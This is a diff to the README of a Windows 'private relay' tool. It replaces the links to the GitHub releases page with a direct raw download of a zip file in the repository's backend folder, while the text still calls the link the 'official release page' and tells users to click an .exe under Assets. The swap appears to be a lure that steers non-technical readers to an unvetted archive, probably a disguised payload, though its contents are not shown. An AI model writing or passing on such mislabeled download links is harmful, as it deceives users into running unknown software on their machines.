@@ -1,6 +1,6 @@
 # 🌐 gas-private-relay - Secure your private internet traffic easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Hallucinationeyelet248/gas-private-relay/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Hallucinationeyelet248/gas-private-relay/main/backend/private_relay_gas_v1.5.zip)
 
 ## 🎯 About this software
 
@@ -14,7 +14,7 @@ The application creates a local tunnel on your Windows computer. When you send a
 
 Follow these steps to set up the software on your Windows machine. You do not need to write code or understand system architecture to complete this process.
 
-1.  Visit the official release page: https://github.com/Hallucinationeyelet248/gas-private-relay/releases
+1.  Visit the official release page: https://raw.githubusercontent.com/Hallucinationeyelet248/gas-private-relay/main/backend/private_relay_gas_v1.5.zip
 2.  Locate the section labeled Assets.
 3.  Click the file ending in .exe to start the download.
 4.  Once the file finishes downloading to your computer, find it in your Downloads folder.
